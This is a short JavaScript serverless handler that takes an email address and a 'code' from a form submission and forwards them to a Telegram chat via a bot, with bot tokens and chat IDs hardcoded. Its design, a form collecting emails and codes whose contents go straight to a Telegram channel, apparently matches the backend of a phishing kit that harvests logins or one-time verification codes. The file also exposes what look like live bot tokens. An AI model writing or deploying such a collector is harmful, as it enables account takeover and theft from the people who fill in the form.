module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const token = '7980617142:AAFzl-zy6O9W1cOIauK9ksDI8Zm7beQ3AsE';
  const token2 = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
  const chatId = '-5263210542';
  const chatId2 = '-5050388811';

  try {
    const { email, code } = req.body;

    const message = `
📩 NEW FORM

📧 Email: ${email}
🔑 code: ${code}
    `;

    const tgRes = await fetch(
      `https://api.telegram.org/bot${token2}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId2,
          text: message
        })
      }
    );

    const data = await tgRes.json();

    return res.status(200).json({
      ok: true,
      telegram: data
    });

  } catch (err) {
    return res.status(500).json({
      error: 'Server error',
      details: err.message
    });
  }
};
